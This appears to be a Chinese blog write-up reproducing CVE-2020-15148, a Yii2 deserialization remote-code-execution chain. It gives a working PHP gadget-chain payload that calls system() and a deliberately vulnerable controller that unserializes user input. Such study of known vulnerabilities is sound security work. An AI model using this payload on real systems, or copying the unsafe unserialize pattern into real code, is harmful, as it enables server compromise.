## 前言

最近想法，复现一些框架的漏洞，提高一下自己的代码审计能力，思来想去还是在`Yii2`开始吧。毕竟最近的比赛`Yii2`遇到的是真的多，找的`poc`都是别的师傅写好的，这可不太行，自己复现一波把。

## 漏洞描述

- **编号：**`CVE-2020-15148`
- **版本：**`Yii2<2.0.38` 

## 环境搭建

- **Download：**`https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz`

## 漏洞复现

漏洞位置：**basic/vendor/yiisoft/yii2/db/BatchQueryResult.php**

首先`Yii2`的`BatchQueryResult`类中使用`__destruct`魔术方法，这里调用了`reset`函数，进行跟踪。

![image-20211011100047812](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011100047812.png)

这里出现的变量`$_dataReader`，是类内变量，也就意味这这是我们可控的。因此我们可以寻找一个类，存在`__call`方法，却不存在`close`这个方法，成功触发`__call`

![image-20211011100446956](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011100446956.png)

全局搜索，在`base\vendor\fzaninotto\faker\src\Faker\Generator.php`中找到符合条件的类，这里推测应该是挖出这个链的师傅一个一个看过来的，真厉害呢

![image-20211011112009228](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011112009228.png)

非常符合条件

![image-20211011112211764](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011112211764.png)

追踪`format`

![image-20211011112437335](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011112437335.png)

这里有一个函数声明，纯纯RCE的预兆，继续跟踪`getFormatter`

![image-20211011113202072](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011113202072.png)

`format`里调用了`call_user_func_array`,`$formatter`与`$arguments`都不可控，目前`$formatter='close'`,`$arguments`为空。`$formatter`传入了`$this->getFormatter`,在这个方法中，`$this->formatters`是可控的，这也就意味着`getFormatter`方法的返回值是可控的。

因此`fomot`里面的`all_user_func_array`这个函数的第一个参数可控，第二个参数为空。

现在可以调用`yii`框架中的任何一个无参的方法。所以，要找一个无参数的方法，在这个方法中我们可以实现任意代码执行或者间接实现任意代码执行。

这里看到别的师傅使用的是正则匹配`function \w+\(\) ?\n?\{(.*\n)+call_user_func`，这里我太菜了，没有找到这个类，只能根据分析好的去找。

![image-20211011123144263](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011123144263.png)

可以看到`$this->checkAccess`以及`$this->id`都可控，构成利用链

```php
yii\db\BatchQueryResult::__destruct() -> Faker\Generator::__call() -> yii\rest\IndexAction::run()
```

因此poc为：

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'dir';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

## 测试poc

在`controllers`目录下创建一个`Controller`作为反序列化入口

```php
<?php
namespace app\controllers;

use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use app\models\LoginForm;

class AxinController extends \yii\web\Controller{
    public function actionDeser($data){
        return unserialize(base64_decode($data));
    }
}
```

![image-20211011123924132](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011123924132.png)

生成poc

![image-20211011124130208](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011124130208.png)

![image-20211011125623986](https://husins.oss-cn-beijing.aliyuncs.com/image-20211011125623986.png)

